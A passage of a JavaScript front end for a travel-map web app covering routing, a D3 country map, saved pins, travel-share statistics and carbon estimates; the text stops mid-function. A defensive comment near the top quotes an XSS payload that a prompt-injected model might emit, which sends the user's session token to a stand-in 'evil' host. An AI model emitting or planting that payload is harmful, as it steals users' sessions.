/* TERN — front end.
   Five pages behind a hash router, one shared state object. The map is drawn
   once and kept alive across navigation, because redrawing it would throw away
   the user's pins and cost another trip to the CDN. */

const API = location.origin.includes('5173') ? 'http://127.0.0.1:8200' : '';
const $  = (s) => document.querySelector(s);
const $$ = (s) => [...document.querySelectorAll(s)];

const state = {
  labels: { visited: new Set(), lived: new Set(), want: new Set() },
  byName: new Map(),      // country name -> record from /api/countries
  chatSession: null,
  shortlist: [],
  wk: { origin: null, places: [], notes: null, theme: null },
  stops: [],        // multi-stop trip: [{iso3, country, city, state}]
  parks: { all: [], country: '', q: '' },
  home: null,
  passport: null,
  homeCity: null,   // city within the home country, optional
  visa: null,       // iso3 -> {code, easy, detail} for the chosen passport
  visaFreeOnly: false,  // trip picker: hide anywhere needing paperwork first
  routeHint: null,      // suggested order for the want-list, shown in the rail
  todo: [],             // the trip checklist: [{text, done}]
  years: new Map(),   // place -> year visited
  cutoff: null,       // timeline position; null = show everything
  lastProfile: null,
  auth: { token: null, email: null },   // null token === guest
};

const COLOR = { visited: '#FFB23F', lived: '#2DD4BF', want: '#9B8CFF' };

/* ===================================================== escaping =========
   Model output is untrusted input. A prompt-injected model that emits
   `<img src=x onerror="fetch('//evil/'+localStorage.tern_token)">` would hand
   over the session token, because this page writes prose into innerHTML.
   Every model-derived string goes through esc() first. */
const esc = (t) => String(t ?? '').replace(/[&<>"']/g, (c) => (
  { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

/* The consultant writes its figures in markdown bold. Escape first, then allow
   exactly one tag back in — asterisks on screen look like a bug. */
const mdBold = (t) => esc(t).replace(/\*\*([^*]+)\*\*/g, '<b>$1</b>');
const ICON  = (id, cls = 'i') => `<svg class="${cls}"><use href="#${id}"/></svg>`;

/* Flags come from flagcdn, keyed on the ISO2 code the API returns. A 1x1
   transparent pixel stands in when a country has no flag, so a broken image
   never appears. */
const BLANK = 'data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==';
const flagUrl = (name, w = 40) => {
  const c = state.byName.get(name);
  return c && c.iso2 ? `https://flagcdn.com/w${w}/${c.iso2.toLowerCase()}.png` : BLANK;
};

/* ========================================================= persistence ===
   Two places a map can live, and which one is in use is the only thing an
   account changes:

     guest      -> this browser's localStorage
     signed in  -> the server, against the account

   While signed in nothing is written to localStorage. That keeps one person's
   countries out of the next person's guest session on a shared machine, and it
   means signing out restores whatever the guest had before, untouched. */
const SAVE_KEY  = 'tern.labels.v1';
const PROF_KEY  = 'tern.profile.v1';
const TOKEN_KEY = 'tern.token.v1';
const TODO_KEY  = 'tern.todo.v1';
const signedIn = () => !!state.auth.token;

const snapshot = () => ({
  visited: [...state.labels.visited],
  lived:   [...state.labels.lived],
  want:    [...state.labels.want],
  home:    state.home,
  passport: state.passport,
  home_city: state.homeCity,
  years:   Object.fromEntries(state.years),
});

function setLabels(map) {
  state.years = new Map(Object.entries((map && map.years) || {})
    .filter(([n, y]) => Number.isFinite(+y)).map(([n, y]) => [n, +y]));
  for (const k of ['visited', 'lived', 'want']) {
    state.labels[k].clear();
    // drop anything the dataset no longer knows, so a stale save cannot
    // inject a country name the API would reject
    (map && map[k] || []).filter((n) => state.byName.has(n))
      .forEach((n) => state.labels[k].add(n));
  }
}

function saveLocal() {
  try { localStorage.setItem(SAVE_KEY, JSON.stringify(snapshot())); }
  catch (e) { /* private mode — the app still works, it just forgets */ }
}
function loadLocal() {
  try { return JSON.parse(localStorage.getItem(SAVE_KEY) || '{}'); }
  catch (e) { return {}; }      // ignore a corrupt save rather than block boot
}

/* Writes are debounced so a burst of clicks is one request, and flushed before
   anything that could end the session — a logout must never drop the last pin. */
let saveTimer = null, savePending = null;
function save() {
  if (!signedIn()) { saveLocal(); return; }
  clearTimeout(saveTimer);
  saveTimer = setTimeout(() => { savePending = pushMap(); }, 500);
}
async function pushMap(opts = {}) {
  try {
    await post('/api/map', snapshot(), opts);
    flash('saved to your account');
  } catch (e) {
    flash(e.message.includes('401') ? 'signed out — map not saved' : 'could not save', true);
  }
}
async function flushSave() {
  clearTimeout(saveTimer);
  if (signedIn()) await pushMap();
  await savePending;
}
function flash(msg, bad) {
  const el = $('#saved');
  if (!el) return;
  el.querySelector('span').textContent = msg;
  el.style.color = bad ? 'var(--coral)' : 'var(--teal)';
  el.classList.add('show');
  clearTimeout(flash.t);
  flash.t = setTimeout(() => el.classList.remove('show'), 2200);
}
// a closing tab still gets its last write out
addEventListener('pagehide', () => {
  if (signedIn()) post('/api/map', snapshot(), { keepalive: true }).catch(() => {});
});

/* ============================================================== router === */
const PAGES = ['map', 'insights', 'next', 'getaways', 'collections', 'heritage',
               'quiz', 'trip', 'consultant', 'about'];
const pageOf = () => {
  const p = (location.hash || '').replace(/^#\/?/, '');
  return PAGES.includes(p) ? p : 'map';
};

/* Seven tabs across one bar left no room for the readout and the account, and
   read as seven unrelated things. They are really four: where you have been,
   where you could go, the trip you are building, and the adviser. Pages and
   their hashes are untouched — this is grouping, not routing. */
const GROUPS = [
  { key: 'world', label: 'My World', pages: [
    { p: 'map',         label: 'Map',         icon: 'i-globe',    hint: 'paint where you have been' },
    { p: 'insights',    label: 'Insights',    icon: 'i-compass',  hint: 'what your map adds up to' }] },
  { key: 'discover', label: 'Discover', pages: [
    { p: 'next',        label: 'Where Next',  icon: 'i-sparkle',  hint: 'countries off your usual path' },
    { p: 'getaways',    label: 'Getaways',    icon: 'i-route',    hint: 'a weekend within reach' },
    { p: 'collections', label: 'National Parks', icon: 'i-stamp', hint: 'the US and Canada, with how to get there' },
    { p: 'heritage',    label: 'Heritage',    icon: 'i-tower',    hint: 'what UNESCO decided to protect' }] },
  { key: 'plan', label: 'Plan', pages: [
    { p: 'trip',        label: 'Trip',        icon: 'i-suitcase', hint: '' }] },
  { key: 'ask', label: 'Consultant', pages: [
    { p: 'consultant',  label: 'Consultant',  icon: 'i-chat',     hint: '' }] },
  { key: 'quiz', label: 'Test Yourself', pages: [
    { p: 'quiz',        label: 'Test Yourself', icon: 'i-globe',  hint: '' }] },
  { key: 'about', label: 'About', pages: [
    { p: 'about',       label: 'About',       icon: 'i-tern',     hint: '' }] },
];
const groupOf = (page) => GROUPS.find((g) => g.pages.some((x) => x.p === page)) || GROUPS[0];

/* The second bar exists only where it earns its place, so the chrome is 60px
   tall on Trip and Consultant and 102px elsewhere. #main is sized from the
   variable rather than a hard-coded number. */
function renderSubnav(group, page) {
  const bar = $('#subnav');
  if (!bar) return;
  const many = group.pages.length > 1;
  bar.hidden = !many;
  if (many) {
    bar.innerHTML = group.pages.map((x) => `
      <a class="subtab${x.p === page ? ' on' : ''}" href="#/${x.p}">
        <svg class="i"><use href="#${x.icon}" /></svg>
        <span class="sl">${x.label}</span>
        ${x.hint && x.p === page ? `<span class="sh">${x.hint}</span>` : ''}
      </a>`).join('');
  }
  document.documentElement.style.setProperty('--chrome', many ? '102px' : '60px');
}

function route() {
  const p = pageOf();
  const group = groupOf(p);
  $$('.page').forEach((el) => el.hidden = el.dataset.page !== p);
  $$('.tab').forEach((a) => a.classList.toggle('on', a.dataset.group === group.key));
  renderSubnav(group, p);
  closePicker();

  // The map is sized from its own bounding box, which is zero while the page
  // is hidden — so it has to be re-measured every time this page comes back.
  if (p === 'map' && typeof sizeMap === 'function') requestAnimationFrame(sizeMap);
  if (p === 'insights') paintInsights();
  if (p === 'next') shortlist();
  if (p === 'getaways') weekend();
  if (p === 'collections') collections();
  if (p === 'heritage') heritage();
  if (p === 'trip') {
    fillStopCountries();
    if (!tripOrigin.touched) resetOrigin();
    if (!$('#t-days')) tripForm();
    renderStops(); refreshRoute(); paintRoute();
  }
  if (p === 'consultant') setTimeout(() => $('#chat-input').focus(), 40);
}
addEventListener('hashchange', route);

/* ================================================================= map === */
let svg, g, path, projection, sizeMap, zoomK = 1;

/* The atlas is joined on ISO 3166 numeric codes, never on country names —
   names were the source of every mismatch the first version had. */
const byNum = new Map();
const nameFor = (d) => {
  if (d.__name) return d.__name;                      // extras carry their own
  const c = byNum.get(String(d.id).padStart(3, '0'));
  if (c) return c.name;
  const raw = d.properties && d.properties.name;      // territories ISO omits
  return state.byName.has(raw) ? raw : null;
};

const UK_NUM = '826';        // replaced on the map by its four nations

async function drawMap() {
  /* 1:50m, not 1:110m. The coarse atlas carries 175 shapes and silently drops
     78 of the countries this app lets you pin — Bahrain, Hong Kong, Macao,
     Malta, the Maldives and most of the Caribbean among them. At 1:50m that
     falls to 17, and map-extras.json covers the rest. */
  const [world, extras] = await Promise.all([
    fetch('https://cdn.jsdelivr.net/npm/world-atlas@2/countries-50m.json').then((r) => r.json()),
    fetch('map-extras.json').then((r) => r.json()).catch(() => ({ parts: [], extra: [], dots: [] })),
  ]);

  const base = topojson.feature(world, world.objects.countries).features
    // the UK polygon goes; England, Scotland, Wales and Northern Ireland
    // arrive from map-extras and are pinned individually
    .filter((f) => String(f.id).padStart(3, '0') !== UK_NUM);

  const asFeature = (e) => ({ type: 'Feature', geometry: e.geometry,
                              properties: {}, __name: e.name });
  const features = [
    ...base,
    ...(extras.extra || []).map(asFeature),
    ...(extras.parts || []).map(asFeature),
  ];
  /* Explicit dots are places with no polygon anywhere. The bigger problem is
     places that *have* a polygon far too small to hit: Macao renders 0.2 px
     across, Tuvalu 0.1. They were technically on the map and practically
     invisible. Anything under MIN_HIT gets a marker as well, worked out from
     the projection rather than a hand-written list of micro-states. */
  const MIN_HIT = 5;
  const explicitDots = (extras.dots || []).filter((d) => state.byName.has(d.name));

  const graticule = d3.geoGraticule10();
  svg = d3.select('#map');
  svg.append('defs').html(
    `<pattern id="hatch" width="6" height="6" patternTransform="rotate(45)"
       patternUnits="userSpaceOnUse">
       <rect width="6" height="6" fill="#0E1626"></rect>
       <line x1="0" y1="0" x2="0" y2="6" stroke="#24324C" stroke-width="2.2"></line>
     </pattern>`);
  g = svg.append('g');

  // ocean first, then the lat/long grid, then land — so it reads as a map
  const sea  = g.append('path').attr('class', 'sea');
  const grat = g.append('path').attr('class', 'grat');

  sizeMap = function () {
    // measured from the stage, never from the <svg> itself — the svg's height
    // attribute applies as a CSS height, so measuring it would feed back
    const stage = $('.stage'), bar = $('.stagebar');
    const w = Math.max(stage.clientWidth, 320);
    const h = Math.max(stage.clientHeight - bar.offsetHeight, 300);
    svg.attr('width', w).attr('height', h).attr('viewBox', `0 0 ${w} ${h}`);
    projection = d3.geoNaturalEarth1()
      .fitExtent([[10, 10], [w - 10, h - 10]], { type: 'Sphere' });
    path = d3.geoPath(projection);
    sea.attr('d', path({ type: 'Sphere' }));
    grat.attr('d', path(graticule));
    g.selectAll('path.c').attr('d', path);
    drawMarkers();
  };

  function at(d) {
    if (d.lonlat) return projection(d.lonlat) || [-99, -99];
    const b = path.bounds(d.feature);
    return [(b[0][0] + b[1][0]) / 2, (b[0][1] + b[1][1]) / 2];
  }

  function drawMarkers() {
    const tiny = features.filter((f) => {
      const n = nameFor(f);
      if (!n || !state.byName.has(n)) return false;
      const b = path.bounds(f);
      if (!isFinite(b[0][0])) return false;
      return Math.max(b[1][0] - b[0][0], b[1][1] - b[0][1]) < MIN_HIT;
    }).map((f) => ({ name: nameFor(f), feature: f }));

    const markers = [...explicitDots, ...tiny];
    g.selectAll('circle.dot').data(markers, (d) => d.name).join(
      (enter) => enter.append('circle')
        .attr('class', 'dot')
        .attr('data-name', (d) => d.name)
        .on('click', (e, d) => openPicker(e, d.name, d.name))
        .on('mousemove', (e, d) => showTip(e, d.name, d.name))
        .on('mouseleave', hideTip),
      (update) => update,
      (exit) => exit.remove());
    g.selectAll('circle.dot')
      .attr('cx', (d) => at(d)[0]).attr('cy', (d) => at(d)[1])
      .attr('r', 3.4 / zoomK);
    paint();
  }

  g.selectAll('path.c').data(features).join('path')
    .attr('class', 'c')
    .attr('data-name', (d) => nameFor(d) || '')
    .classed('nodata', (d) => {
      const c = state.byName.get(nameFor(d));
      return !c || !c.has_data;
    })
    .on('click', (e, d) => openPicker(e, nameFor(d), d.properties && d.properties.name))
    .on('mousemove', (e, d) => showTip(e, nameFor(d), d.properties && d.properties.name))
    .on('mouseleave', hideTip);

  sizeMap();
  addEventListener('resize', () => sizeMap());

  svg.call(d3.zoom().scaleExtent([1, 8]).on('zoom', (e) => {
    zoomK = e.transform.k;
    g.attr('transform', e.transform);
    // markers keep a constant screen size, and vanish once the real polygon
    // underneath is big enough to click on its own
    g.selectAll('circle.dot')
      .attr('r', 3.4 / zoomK)
      .attr('opacity', zoomK > 4 ? 0 : 1)
      .style('pointer-events', zoomK > 4 ? 'none' : 'auto');
  }));
  sizeMap();
  paint();

  // A silent mismatch here would quietly mislabel the world, so it is reported.
  const unmatched = features.filter((d) => !nameFor(d))
    .map((d) => `${(d.properties && d.properties.name) || '?'} (${d.id})`);
  const covered = new Set(features.map(nameFor).filter(Boolean)
    .concat(explicitDots.map((d) => d.name)));
  const absent = [...state.byName.keys()].filter((n) => !covered.has(n));
  console.info(`map: ${features.length} shapes + `
    + `${g.selectAll('circle.dot').size()} markers, `
    + `covering ${covered.size}/${state.byName.size} pinnable countries`);
  if (unmatched.length) console.warn('shapes with no country match:', unmatched.sort());
  if (absent.length) console.warn('countries with no shape or dot:', absent.sort());
}

const labelOf = (name) =>
  ['visited', 'lived', 'want'].find((k) => state.labels[k].has(name)) || null;

/* A place is hidden at a given cutoff only if it has a year and that year is
   later. Untagged pins always show — hiding them would silently erase most of
   a map the moment one country got a date. */
function visibleAt(name) {
  if (state.cutoff === null) return true;
  const y = state.years.get(name);
  return y === undefined ? true : y <= state.cutoff;
}

function paint() {
  if (!g) return;
  const fill = (n) => {
    const c = n && state.byName.get(n);
    const l = n && labelOf(n) && visibleAt(n) ? labelOf(n) : null;
    if (l) return COLOR[l];                       // labelled wins
    if (!c || !c.has_data) return 'url(#hatch)';  // no arrivals figure
    return '#243457';
  };
  g.selectAll('path.c').attr('fill', (d) => fill(nameFor(d)));
  g.selectAll('circle.dot')
    .attr('fill', (d) => (labelOf(d.name) && visibleAt(d.name)
      ? COLOR[labelOf(d.name)] : '#46587E'));
}

function setLabel(name, kind, year) {
  ['visited', 'lived', 'want'].forEach((k) => state.labels[k].delete(name));
  if (kind) state.labels[kind].add(name); else state.years.delete(name);
  if (kind && year) state.years.set(name, year);
  if (kind && !year) state.years.delete(name);
  save(); paint(); renderLists(); buildTimeline(); refresh();
}

/* one popover does all three labels, so there is no mode to remember */
let pickerFor = null;
function openPicker(e, name, rawName) {
  if (!name || !state.byName.has(name)) { closePicker(); showTip(e, name, rawName); return; }
  const c = state.byName.get(name);
  hideTip();
  pickerFor = name;
  $('#pk-flag').src = flagUrl(name, 80);
  $('#pk-name').textContent = name;
  $('#pk-stat').textContent = c.has_data
    ? `${c.arrivals.toLocaleString()} arrivals · 1 in ${c.one_in_n_trips.toLocaleString()} trips`
      + (c.stale ? ` · ${c.reference_year} data` : '')
      // UN Tourism publishes one figure for the whole UK, so Scotland's tile
      // would otherwise look like Scotland's own arrivals. It is not.
      + (c.figures_are ? ` — reported for ${c.figures_are} as a whole` : '')
    : 'no arrivals data — counts as a country, not toward world travel share';
  const cur = labelOf(name);
  $$('.pk').forEach((b) => b.classList.toggle('on', b.dataset.set === cur));
  $('#pk-year-wrap').hidden = !(cur === 'visited' || cur === 'lived');
  $('#pk-year').value = state.years.get(name) || '';
  const pk = $('#picker');
  pk.hidden = false;
  pk.style.left = Math.min(e.clientX - 20, innerWidth - 250) + 'px';
  pk.style.top  = Math.min(e.clientY - 10, innerHeight - 190) + 'px';
}
function closePicker() { pickerFor = null; const p = $('#picker'); if (p) p.hidden = true; }

$$('.pk, .pk-clear').forEach((b) => b.onclick = () => {
  if (!pickerFor) return closePicker();
  const kind = b.dataset.set || null;
  // keep a year already recorded when switching between visited and lived
  const year = (kind === 'visited' || kind === 'lived')
    ? (+$('#pk-year').value || state.years.get(pickerFor) || null) : null;
  setLabel(pickerFor, kind, year);
  if (kind === 'visited' || kind === 'lived') {
    $('#pk-year-wrap').hidden = false;
    $$('.pk').forEach((x) => x.classList.toggle('on', x.dataset.set === kind));
    return;                       // stay open so a year can be typed
  }
  closePicker();
});
/* `on()` instead of a bare assignment: a typo'd selector used to throw at
   module level, which stopped the script before boot() ran and left a blank
   page with no map. A missing element should disable one control, not the app. */
function on(sel, event, fn) {
  const el = $(sel);
  if (el) el[event] = fn;
  else console.warn(`no element for ${sel} — ${event} handler not attached`);
}

on('#pk-year', 'oninput', () => {
  if (!pickerFor) return;
  const k = labelOf(pickerFor);
  if (k === 'visited' || k === 'lived') setLabel(pickerFor, k, +$('#pk-year').value || null);
});
on('#pk-year', 'onkeydown', (e) => {
  if (e.key === 'Enter') { e.preventDefault(); closePicker(); }
});
addEventListener('click', (e) => {
  if (!e.target.closest('#picker') && !e.target.closest('#map')) closePicker();
});
addEventListener('keydown', (e) => e.key === 'Escape' && closePicker());

$('#clear-all').onclick = () => {
  ['visited', 'lived', 'want'].forEach((k) => state.labels[k].clear());
  state.years.clear(); state.cutoff = null;
  save(); paint(); renderLists(); buildTimeline(); refresh();
};

/* all three lists visible at once — no switching to see what you picked */
function renderLists() {
  const rows = [['visited', 'Visited'], ['lived', 'Lived'], ['want', 'Want to go']];
  $('#lists').innerHTML = rows.map(([k, label]) => {
    const items = [...state.labels[k]].sort();
    return `<div class="lrow ${k}"><div class="tagname"><i></i>${label}</div>`
      + (items.length
        ? `<div class="chips">${items.map((n) =>
            `<span class="chip ${k}" data-chip="${n}" title="${n} — click to remove"
               ><img class="flag" src="${flagUrl(n, 40)}" alt="${n}" loading="lazy" /></span>`).join('')}</div>`
        : `<div class="lnone">none yet</div>`)
      + `</div>`;
  }).join('');
  $('#lists').querySelectorAll('[data-chip]').forEach((el) =>
    el.onclick = () => setLabel(el.dataset.chip, null));
}

function showTip(e, name, rawName) {
  const t = $('#tip');
  const place = (html) => {
    t.innerHTML = html;
    t.style.left = Math.min(e.clientX + 14, innerWidth - 260) + 'px';
    t.style.top  = (e.clientY + 16) + 'px';
    t.style.opacity = 1;
  };
  if (!name || !state.byName.has(name)) {
    return place(`<div class="head"><b>${rawName || 'Not a country'}</b></div>`
      + `<em>No ISO country matches this shape.</em>`);
  }
  const c = state.byName.get(name), l = labelOf(name);
  const head = `<div class="head"><img class="flag" src="${flagUrl(name)}" alt="" loading="lazy" /><b>${name}</b></div>`;
  if (!c.has_data) {
    return place(head + `<em>UN Tourism never published arrivals here. You can still mark it `
      + `— it just will not count toward your share of world travel.</em>`
      + (l ? `<em>${l}</em>` : ''));
  }
  place(head
    + `${c.arrivals.toLocaleString()} arrivals · 1 in ${c.one_in_n_trips.toLocaleString()} trips`
    + (c.figures_are ? `<em>Figure is for ${c.figures_are} as a whole — UN Tourism `
        + `does not report the four nations separately.</em>` : '')
    + (c.stale ? `<em>${c.reference_year} data</em>` : '')
    + (l ? `<em>${l}</em>` : ''));
}
const hideTip = () => { $('#tip').style.opacity = 0; };

/* ================================================== the instant data tier == */
const payload = () => snapshot();

/* Called on every label change. /api/profile is pure Python and answers in
   milliseconds, so the numbers never wait on a model. */
async function refresh() {
  const pinned = [...state.labels.visited, ...state.labels.lived];
  if (!pinned.length) {
    state.lastProfile = null;
    ['#nav-count', '#m-count'].forEach((s) => $(s).textContent = '0');
    ['#nav-world', '#m-world'].forEach((s) => $(s).textContent = '0%');
    paintInsights();
    return;
  }
  state.lastProfile = await post('/api/profile', payload());
  const d = state.lastProfile;
  ['#nav-count', '#m-count'].forEach((s) => $(s).textContent = pinned.length);
  ['#nav-world', '#m-world'].forEach((s) => $(s).textContent = d.world_coverage.display);
  if (pageOf() === 'insights') paintInsights();
}

function paintInsights() {
  const d = state.lastProfile;
  $('#ins-empty').hidden = !!d;
  $('#ins-body').hidden  = !d;
  if (!d) return;

  const p = d.profile;
  const pinned = [...state.labels.visited, ...state.labels.lived];
  const nodata = pinned.filter((n) => !(state.byName.get(n) || {}).has_data);

  $('#stamp').className = 'stamp ' + p.verdict;
  $('#vbig').textContent = p.verdict === 'tourist' ? 'Tourist' : 'Traveler';
  $('#vstampsub').textContent = p.verdict === 'tourist' ? 'well-trodden' : 'off the main line';

  const place = pinned.length === 1 ? 'place' : 'places';
  let sub = p.verdict === 'tourist'
    ? `Your ${pinned.length} ${place} take ${p.flow_coverage_pct}% of all human travel — the well-trodden world.`
    : `Your ${pinned.length} ${place} take only ${p.flow_coverage_pct}% of all human travel.`;
  if (nodata.length) {
    sub += ` ${nodata.length} of them (${nodata.slice(0, 3).join(', ')}${nodata.length > 3 ? '…' : ''}) `
      + `have no published arrivals, so they count as countries but not toward that share.`;
  }
  $('#vsub').textContent = sub;

  $('#s-count').textContent = pinned.length;
  $('#s-flow').textContent  = p.flow_coverage_pct + '%';
  $('#s-rare').textContent  = p.rarest ? `1 in ${p.rarest.one_in_n.toLocaleString()}` : '—';

  // Every tile is a counted figure. There is deliberately no "top X% of
  // travellers" anywhere: arrivals data counts trips, not people, so that
  // number could only ever be a guess. The survey says what it can, as prose.
  /* Countries and territories are counted separately and labelled separately.
     Hong Kong is somewhere you have genuinely been, but it is not one of the
     195 — folding it in would inflate the headline, dropping it would lose the
     pin, so it gets its own line. */
  const wc = d.world_coverage, cov = d.coverage;
  $('#s-world').textContent = wc.display;
  const terrWord = cov.territories === 1 ? 'territory' : 'territories';
  $('#s-terr').textContent = cov.territories ? `+ ${cov.territories} ${terrWord}` : '';
  $('#s-world').parentElement.title =
    `${wc.n_countries} of ${wc.of_countries} UN member states and observers`
    + (cov.territories
      ? `, plus ${cov.territories} ${terrWord} (${cov.territory_names.join(', ')}) `
        + `— real places, but not countries, so they are not in the percentage.`
      : `. ${wc.remaining} to go.`);

  /* A bare "55.42% of world travel" tells a user nothing — 55% of what, and is
     that a lot? So the figure is restated as a count out of 100 trips, and the
     bar carries the two anchors that make it readable: the tourist threshold,
     and what the ten most-visited countries add up to on their own. */
  const bm = d.benchmarks, pct = p.flow_coverage_pct;
  $('#mval').textContent = pct + '%';
  $('#mfill').style.width = Math.min(pct, 100) + '%';
  $('#mmark').style.left  = bm.tourist_threshold + '%';
  $('#mtop10').style.left = bm.top_10_pct + '%';
  $('#mmark').querySelector('i').textContent  = `tourist line · ${bm.tourist_threshold}%`;
  $('#mtop10').querySelector('i').textContent =
    `all top-10 countries · ${bm.top_10_pct}%`;

  /* The denominator has to move. A really off-the-beaten-track map is a
     fraction of one percent, and "about 0 of every 100 trips" reads like a
     broken page — on the one profile this app exists to reward. Below one
     percent it flips to the same 1-in-N phrasing the rarest-stop tile uses. */
  const n100 = Math.round(pct);
  $('#mlede').innerHTML = pct >= 1
    ? `Of every <b>100</b> international trips taken on Earth, about <b>${n100}</b> `
      + `${n100 === 1 ? 'ends' : 'end'} in a country you have been to.`
    : `About <b>1 in every ${Math.round(100 / Math.max(pct, 0.0001)).toLocaleString()}</b> `
      + `international trips taken on Earth ends in a country you have been to.`;

  const vs = pct >= bm.top_10_pct
    ? `That is more than the ten most-visited countries on the planet manage between `
      + `them (${bm.top_10_pct}%) — your map is built on the big destinations.`
    : pct >= bm.tourist_threshold
      ? `The ten most-visited countries add up to ${bm.top_10_pct}%, so you are in `
        + `roughly that territory — mostly well-known places.`
      : `The ten most-visited countries add up to ${bm.top_10_pct}%, so you are well `
        + `below the beaten track.`;
  /* 206 vs 195 reads as a contradiction unless the difference is spelled out,
     so it is spelled out rather than left for the reader to puzzle over. */
  $('#mnote').innerHTML =
    `Travel is far more concentrated than people expect: just <b>${bm.countries_for_half} `
    + `countries</b> receive half of all international travel, and ${bm.most_visited} alone `
    + `takes <b>${bm.most_visited_pct}%</b>. ${vs}`
    + `<br>Counted from ${bm.world_trips.toLocaleString()} international trips in `
    + `${bm.reference_year}. UN Tourism publishes figures for `
    + `<b>${bm.destinations_with_data} destinations</b>: `
    + `${bm.countries_with_data} of the world's ${bm.un_countries} countries, plus `
    + `${bm.territories_with_data} territories such as Hong Kong, Puerto Rico and Guam `
    + `that report their own arrivals without being separate countries. The remaining `
    + `${bm.countries_without_data} countries publish nothing — you can still pin them, `
    + `they just cannot count toward a share of world travel.`;

  paintFootprint(d);
  paintReach(d);
  paintGaps(d);

  const op = d.off_path, ctx = d.peer_context, bits = [];
  if (op.in_tail) {
    bits.push(`<b>${op.in_tail}</b> of your stops ${op.in_tail === 1 ? 'is' : 'are'} `
      + `among the world's ${op.cutoff} least-visited countries`
      + (op.in_tail <= 4 ? ` (${op.countries.join(', ')})` : '') + '.');
  }
  bits.push(ctx.sentence);
  // The caveat is the honest part, so it stays on the page — but as a source
  // tag rather than a paragraph, or it crowds out the numbers it qualifies.
  bits.push(`<br><span class="src" title="${ctx.caveat}">${ctx.source} ⓘ</span>`);
  $('#context').innerHTML = bits.join(' ');
}

/* -------------------------------------------------------------- timeline */
let tlTimer = null;

function buildTimeline() {
  const years = [...state.years.values()].filter(Number.isFinite);
  const bar = $('#timeline');
  // one year is not a timeline
  if (years.length < 2) {
    bar.hidden = true;
    if (state.cutoff !== null) { state.cutoff = null; paint(); }
    return;
  }
  bar.hidden = false;
  const lo = Math.min(...years), hi = Math.max(...years);
  const r = $('#tl-range');
  r.min = lo; r.max = hi; r.step = 1;
  if (state.cutoff === null || state.cutoff < lo || state.cutoff > hi) r.value = hi;
  else r.value = state.cutoff;
  paintTimelineLabel();
}

function paintTimelineLabel() {
  const shown = [...state.labels.visited, ...state.labels.lived].filter(visibleAt).length;
  $('#tl-year').textContent = state.cutoff === null ? 'all' : state.cutoff;
  $('#tl-count').textContent = `${shown} place${shown === 1 ? '' : 's'}`;
}

$('#tl-range').oninput = () => {
  state.cutoff = +$('#tl-range').value;
  paint(); paintTimelineLabel();
};
$('#tl-all').onclick = () => {
  clearInterval(tlTimer);
  state.cutoff = null;
  $('#tl-range').value = $('#tl-range').max;
  paint(); paintTimelineLabel();
};
$('#tl-play').onclick = () => {
  clearInterval(tlTimer);
  const r = $('#tl-range'), lo = +r.min, hi = +r.max;
  state.cutoff = lo; r.value = lo; paint(); paintTimelineLabel();
  tlTimer = setInterval(() => {
    if (state.cutoff >= hi) { clearInterval(tlTimer); return; }
    state.cutoff += 1; r.value = state.cutoff;
    paint(); paintTimelineLabel();
  }, 550);
};

/* ---------------------------------------------------------- footprint --- */
/* Shown only when a home country is set. Without one there is no honest
   distance to report, so the whole block hides rather than showing zeroes. */
function paintFootprint(d) {
  const blk = $('#blk-footprint'), f = d.footprint;
  blk.hidden = !f || !f.legs.length;
  if (blk.hidden) return;
  const km = f.total_km.toLocaleString();
  $('#fp-tiles').innerHTML = `
    <div class="stat">${ICON('i-plane')}<b>${km}</b>
      <span>km flown across ${f.trips} ${f.trips === 1 ? 'journey' : 'journeys'}</span></div>
    <div class="stat">${ICON('i-globe')}<b>${f.times_around_earth}&times;</b><span>around the Earth</span></div>
    <div class="stat hero">${ICON('i-leaf')}<b>${f.tonnes_co2e} t</b><span>CO&#8322;e, economy class</span></div>
    <div class="stat">${ICON('i-pin')}<b>${Math.round(f.furthest.km_each_way).toLocaleString()} km</b>
      <span>furthest: ${state.isoName.get(f.furthest.iso3) || f.furthest.iso3}</span></div>`;
  // What it would take to absorb that, in published units — and what that
  // does not mean. A bare "plant 100 trees" is comforting arithmetic.
  const o = f.offsets;
  $('#fp-offset').innerHTML = (!o || !o.trees) ? '' : `
    <h5>${ICON('i-leaf')}To absorb ${o.tonnes} tonnes you would need</h5>
    <div class="offsets">
      <div class="off"><b>${o.trees.toLocaleString()}</b>
        <span>trees, growing for ${o.tree_years} years</span></div>
      <div class="off"><b>${o.forest_acres.toLocaleString()}</b>
        <span>acres of US forest, for a year</span></div>
      <div class="off"><b>${o.cars_off_road}</b>
        <span>cars off the road for a year</span></div>
      <div class="off"><b>${o.homes_powered}</b>
        <span>homes' electricity for a year</span></div>
    </div>
    <p class="offnote"><b>${esc(o.caveat)}</b></p>
    <p class="offnote">${esc(o.tree_note)} Equivalences from the ${esc(o.source)}.</p>`;

  // The trip count drives this number far more than the per-km factor does,
  // so the note leads with the assumption rather than burying it.
  $('#fp-note').innerHTML =
    `Measured from <b>${esc(f.from || state.isoName.get(f.home) || f.home)}</b> and `
    + `${esc(f.assumption)}. `
    + `<b>That grouping is the biggest source of error here</b> — counting a `
    + `separate return flight per country put ten European countries at 18.1 t `
    + `when one trip is 2.8 t. `
    + `Carbon uses ${esc(f.carbon_source)}: New York to London comes out at 1.65 t `
    + `return, within the published range. Great-circle distance is shorter than `
    + `the route actually flown and this excludes the radiative-forcing uplift, `
    + `which would roughly double the climate effect; a business-class seat is `
    + `two to three times economy. Treat it as an estimate, not a measurement.`;
}

/* -------------------------------------------------------------- reach --- */
function paintReach(d) {
  const r = d.reach, v = d.visa;
  const pills = (arr, n) => arr.slice(0, n).map((x) => `<span class="pill">${x}</span>`).join('')
    + (arr.length > n ? `<span class="pill more">+${arr.length - n}</span>` : '');
  let html = `
    <div class="rcard"><h4>${r.n_languages}<em>languages</em></h4>
      <div class="items">${pills(r.languages, 7)}</div></div>
    <div class="rcard"><h4>${r.n_currencies}<em>currencies</em></h4>
      <div class="items">${pills(r.currencies, 7)}</div></div>
    <div class="rcard"><h4>${r.n_subregions}<em>sub-regions</em></h4>
      <div class="items">${pills(r.subregions, 5)}</div></div>`;
  if (v && v.known) {
    const pct = Math.round(v.easy_visited / Math.max(v.easy_total, 1) * 100);
    html += `<div class="rcard"><h4>${v.easy_visited} / ${v.easy_total}<em>visa-free used</em></h4>
      <div class="bar" style="height:4px;border-radius:99px;background:#0A111E;margin-top:9px;overflow:hidden">
        <i style="display:block;height:100%;width:${pct}%;background:var(--brand)"></i></div>
